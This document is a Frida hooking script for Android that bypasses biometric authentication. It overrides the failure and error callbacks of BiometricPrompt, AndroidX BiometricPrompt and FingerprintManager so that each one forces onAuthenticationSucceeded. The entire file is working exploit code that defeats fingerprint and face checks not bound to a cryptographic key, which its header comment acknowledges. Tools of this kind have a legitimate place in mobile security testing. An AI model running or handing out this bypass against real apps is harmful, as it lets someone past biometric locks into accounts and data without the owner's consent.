// Bypasses unbound biometric flows on Android by hooking BiometricPrompt
// (API 28+), AndroidX BiometricPrompt, and legacy FingerprintManager callbacks
// to force onAuthenticationSucceeded regardless of the actual auth outcome.
// NOTE: does NOT work against crypto-bound biometrics — the CryptoObject key
// is only unlocked by the secure enclave on a real match.

Java.perform(function () {

  // ── Android 9+ BiometricPrompt ────────────────────────────────────────────
  try {
    var BioCb = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    BioCb.onAuthenticationFailed.implementation = function () {
      send({ type: 'biometric_bypass', event: 'BiometricPrompt.onAuthenticationFailed — forcing success' });
      this.onAuthenticationSucceeded(null);
    };
    BioCb.onAuthenticationError.implementation = function (code, msg) {
      send({ type: 'biometric_bypass', event: 'BiometricPrompt.onAuthenticationError', code: code, msg: msg ? msg.toString() : '' });
      this.onAuthenticationSucceeded(null);
    };
    send({ type: 'biometric_bypass', event: 'android.hardware.biometrics hooks installed' });
  } catch (e) {
    send({ type: 'biometric_bypass', event: 'android.hardware.biometrics not available: ' + e.message });
  }

  // ── AndroidX BiometricPrompt (jetpack) ────────────────────────────────────
  try {
    var BioCompatCb = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    var AuthResult  = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
    BioCompatCb.onAuthenticationFailed.implementation = function () {
      send({ type: 'biometric_bypass', event: 'androidx.biometric.onAuthenticationFailed — forcing success' });
      this.onAuthenticationSucceeded(AuthResult.$new(null, 0));
    };
    BioCompatCb.onAuthenticationError.implementation = function (code, msg) {
      send({ type: 'biometric_bypass', event: 'androidx.biometric.onAuthenticationError', code: code });
      this.onAuthenticationSucceeded(AuthResult.$new(null, 0));
    };
    send({ type: 'biometric_bypass', event: 'androidx.biometric hooks installed' });
  } catch (e) {
    send({ type: 'biometric_bypass', event: 'androidx.biometric not available: ' + e.message });
  }

  // ── Legacy FingerprintManager (pre-Android 9) ─────────────────────────────
  try {
    var FpCb = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');
    FpCb.onAuthenticationFailed.implementation = function () {
      send({ type: 'biometric_bypass', event: 'FingerprintManager.onAuthenticationFailed — forcing success' });
      this.onAuthenticationSucceeded(null);
    };
    FpCb.onAuthenticationError.implementation = function (code, msg) {
      send({ type: 'biometric_bypass', event: 'FingerprintManager.onAuthenticationError', code: code });
      this.onAuthenticationSucceeded(null);
    };
    send({ type: 'biometric_bypass', event: 'FingerprintManager hooks installed' });
  } catch (e) {
    send({ type: 'biometric_bypass', event: 'FingerprintManager not available: ' + e.message });
  }

});
